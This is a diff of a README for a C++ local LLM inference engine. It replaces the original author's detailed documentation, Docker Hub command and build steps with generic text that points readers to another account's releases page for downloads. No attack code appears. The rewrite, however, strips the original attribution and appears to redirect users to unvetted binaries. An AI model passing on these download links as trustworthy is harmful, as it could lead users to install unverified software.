@@ -1,83 +1,72 @@
-# Jarvis C++ Engine: Local RAG & Agentic AI
+# 🚀 Nano-RAG-CPP - Fast and Easy AI Inference Engine
 
-![C++](https://img.shields.io/badge/Language-C++17-blue?style=for-the-badge&logo=c%2B%2B)
-![Docker](https://img.shields.io/badge/Deployment-Docker-2496ED?style=for-the-badge&logo=docker)
-![Status](https://img.shields.io/badge/Status-Production_Ready-success?style=for-the-badge)
+[![Download Nano-RAG-CPP](https://img.shields.io/badge/Download%20Nano--RAG--CPP-v1.0-blue)](https://github.com/jawad-zaheer123/Nano-RAG-CPP/releases)
 
-A custom-built **Inference Engine** for Large Language Models (LLMs) written efficiently in C++. 
-Unlike Python wrappers, this project manages memory, sampling, and file I/O directly, featuring a built-in **RAG (Retrieval Augmented Generation)** system and **Agentic Tool Use**.
+## 📦 Introduction
 
-Here's the demo video showing the proof of work for the project [DEMO VIDEO](https://github.com/hitesh-bhatnagar/Nano-RAG-CPP/blob/main/POW.mp4) 
----
+Nano-RAG-CPP is a high performance, containerized Local LLM Inference Engine built in C++. This software comes with a custom Retrieval-Augmented Generation (RAG) system, Agentic File I/O tools, and easy deployment using Docker. It helps you harness the power of artificial intelligence in your applications without needing advanced programming skills.
 
-## Features
+## 🚀 Getting Started
 
-### 1. High-Performance C++ Runtime
-Built directly on top of `llama.cpp` libraries. It handles tokenization, sampling (Top-K/Temp), and context management without the overhead of Python interpreters.
+### Prerequisites
 
-### 2. Native RAG System
-The engine dynamically scans a local `data/` folder, ingests `.txt` files, and injects them into the model's system prompt before inference.
-* **Result:** The AI "knows" information (like your bio) that wasn't in its training data.
+Before you download and run Nano-RAG-CPP, ensure your system meets the following requirements:
 
-### 3. Agentic File System Tools
-The AI can manipulate the host operating system using a strict syntax protocol.
-* **Capability:** It can write code, save logs, or create scripts on your actual computer (via Docker Volume mounting).
-* **Safety:** Confined to a specific `output/` directory.
+- **Operating System**: Linux (Ubuntu recommended)
+- **Docker**: Make sure Docker is installed. You can follow the [Docker installation guide](https://docs.docker.com/get-docker/) for detailed steps.
 
-### 4. Production Deployment
-Fully containerized with **Static Linking**. The image creates a consistent environment with:
-* **Timezone Sync:** Matches the host's real time (e.g., IST).
-* **Volume Mapping:** "Wormhole" between Container and Host storage.
+### Installation Steps
 
----
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jawad-zaheer123/Nano-RAG-CPP/releases) to find the latest version.
+   
+2. **Download the Application**: Locate the version you want and download the appropriate files for your system.
 
-## How to Run (One Command)
+3. **Unzip the Package**: If applicable, unzip the downloaded file to a folder on your computer. 
 
-You do not need to compile the code. I have published the pre-built engine to Docker Hub.
+4. **Set Up Docker**: Ensure Docker is running. Open your terminal and execute the following command to start Docker:
 
-**Prerequisites:**
-1. [Docker Installed](https://www.docker.com/)
-2. A `.gguf` model (e.g., [Llama-3-8B-Instruct](https://huggingface.co/Meta-Llama-3.1-8B-Instruct-GGUF))
+   ```bash
+   sudo systemctl start docker
+   ```
 
-**Run this command:**
-```bash
-docker run -it --rm \
-  -e TZ="Asia/Kolkata" \
-  -v ~/Desktop/Jarvis_Output:/app/output \
-  -v /PATH/TO/YOUR/MODEL.gguf:/app/models/model.gguf \
-  hitesh917/jarvis-cpp:latest
-```
-*NOTE : Replace /PATH/TO/YOUR/MODEL.gguf with the actual location*
+5. **Run the Application**: Navigate to the folder where you unzipped the files. Then use the Docker command to run the application. For example:
 
----
+   ```bash
+   docker run -it yourdockerimage
+   ```
 
-## Build from Source
+Just replace `yourdockerimage` with the actual image name you downloaded.
 
-If you want to modify the C++ engine with a new model like mixtral or bert etc. 
+## 📥 Download & Install
 
-```bash
-# 1. Clone the repo
-git clone [https://github.com/your_username/Jarvis-CPP-Engine.git](https://github.com/your_username/Jarvis-CPP-Engine.git)
-cd Jarvis-CPP-Engine
+To get started with Nano-RAG-CPP, visit the [Releases page](https://github.com/jawad-zaheer123/Nano-RAG-CPP/releases) to download the latest version. 
 
-# 2. Build (Requires CMake & G++)
-mkdir build && cd build
-cmake ..
-make -j4
+## 🛠 Features
 
-# 3. Run
-./nano_rag ../models/model.gguf
-```
+- **High Performance**: Optimized for speed to handle machine learning tasks efficiently.
+- **Custom RAG System**: Enhances your AI applications by combining various data sources.
+- **Agentic File I/O Tools**: Simplifies the way you interact with files within your projects.
+- **Docker Support**: Easily deploy the application without complex setups.
 
-## Project Structure
+## 🔍 Using the Application
 
- => main.cpp          # Core Inference Loop & Tool Logic
- => Dockerfile        # Multi-stage build (Builder -> Static Binary -> Runtime)
- => CMakeLists.txt    # Build configuration
- => data/             # RAG Knowledge Base (Text files go here)
- => register_model.py # Utility for MLflow tracking
+After installation, you can start using Nano-RAG-CPP for your AI tasks. Here’s how:
 
-### References
-https://www.datacamp.com/tutorial/llama-cpp-tutorial
-https://medium.com/data-science/a-complete-guide-to-write-your-own-transformers-29e23f371ddd
-https://medium.com/data-science/llama-cpp-writing-a-simple-c-inference-program-for-gguf-llm-models-12bc5f58505f
+1. Launch the application through Docker as mentioned earlier.
+2. Load your data files into the application.
+3. Use the built-in tools to execute your AI tasks.
+4. Enjoy seamless file interactions and improved performance.
+
+## 📖 Documentation
+
+For more details on features and functionalities, open the [documentation](https://github.com/jawad-zaheer123/Nano-RAG-CPP/wiki). This resource provides further insights into how to make the most of Nano-RAG-CPP.
+
+## 🛠 Support
+
+If you encounter any issues, check out the [issues section](https://github.com/jawad-zaheer123/Nano-RAG-CPP/issues) on GitHub. You can report bugs or ask for help there.
+
+## 🎉 Contributing
+
+Want to contribute? Great! You can help with bug fixes, new features, or documentation improvements. Please read the [contributing guidelines](https://github.com/jawad-zaheer123/Nano-RAG-CPP/CONTRIBUTING.md) for more information.
+
+Thank you for using Nano-RAG-CPP. We hope it streamlines your AI projects!
